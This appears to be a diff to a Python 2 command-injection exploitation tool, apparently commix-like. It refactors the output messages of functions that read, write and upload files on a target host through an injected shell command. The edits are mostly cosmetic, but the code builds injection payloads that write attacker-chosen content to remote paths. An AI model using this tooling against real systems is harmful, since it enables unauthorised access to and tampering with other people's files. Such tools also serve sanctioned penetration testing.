@@ -51,15 +51,20 @@ def file_read(separator, payload, TAG, delay, prefix, suffix, http_request_metho
   if menu.options.verbose:
     print ""
   if shell:
-    sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
-    sys.stdout.flush()
+    success_msg = "The contents of file '" + Style.UNDERLINE 
+    success_msg += file_to_read + Style.RESET_ALL + "' : "
+    sys.stdout.write(settings.print_success_msg(success_msg))
     print shell
     output_file = open(filename, "a")
-    output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
+    success_msg = "The contents of file '"
+    success_msg += file_to_read + "' : " + shell + ".\n"
+    output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
     output_file.close()
   else:
-   sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read the '" + file_to_read + "' file." + Style.RESET_ALL + "\n")
-   sys.stdout.flush()
+    warn_msg = "It seems that you don't have permissions "
+    warn_msg += "to read the '" + file_to_read + "' file."
+    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
+    sys.stdout.flush()
 
 """
 Write to a file on the target host.
@@ -67,7 +72,8 @@ Write to a file on the target host.
 def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
-    sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that the '" + file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
+    warn_msg = "It seems that the '" + file_to_write + "' file, does not exists."
+    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -79,7 +85,8 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
       import base64
       content = base64.b64encode(content)
   else:
-    sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + file_to_write + "' is not a file." + Style.RESET_ALL + "\n")
+    warn_msg = "It seems that '" + file_to_write + "' is not a file."
+    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
     sys.stdout.flush()
     
   if os.path.split(menu.options.file_dest)[1] == "" :
@@ -117,8 +124,6 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
 
   else:
     cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'" + settings.COMMENT
-    # Comment out the rest payload
-    cmd = cmd + "#"
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
@@ -131,11 +136,14 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was created successfully!\n" + Style.RESET_ALL)
+    success_msg = "The " + Style.UNDERLINE + shell + Style.RESET_ALL
+    success_msg += Style.BRIGHT + " file was created successfully!" + "\n" 
+    sys.stdout.write(settings.print_success_msg(success_msg))
     sys.stdout.flush()
   else:
-   sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_write + "' file." + Style.RESET_ALL + "\n")
-   sys.stdout.flush()
+    warn_msg = "It seems that you don't have permissions to write the '" + dest_to_write + "' file."
+    sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
+    sys.stdout.flush()
 
 """
 Upload a file on the target host.
@@ -149,8 +157,9 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_met
     # check if remote file exists.
     try:
       urllib2.urlopen(file_to_upload)
-    except urllib2.HTTPError, err:
-      sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err)+ ")" + Style.RESET_ALL + "\n")
+    except urllib2.HTTPError, err_msg:
+      warn_msg = "It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err_msg)+ ")"
+      sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
       sys.stdout.flush()
       sys.exit(0)
       
@@ -179,11 +188,15 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_met
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" + Style.RESET_ALL + "\n")
+      success_msg = "The " + Style.UNDERLINE + shell
+      success_msg += Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" 
+      sys.stdout.write(settings.print_success_msg(success_msg) + "\n")
       sys.stdout.flush()
     else:
-     sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_upload + "' file." + Style.RESET_ALL + "\n")
-     sys.stdout.flush()
+      warn_msg = "It seems that you don't have permissions to "
+      warn_msg += "write the '" + dest_to_upload + "' file."  
+      sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
+      sys.stdout.flush()
 
 """
 Check the defined options
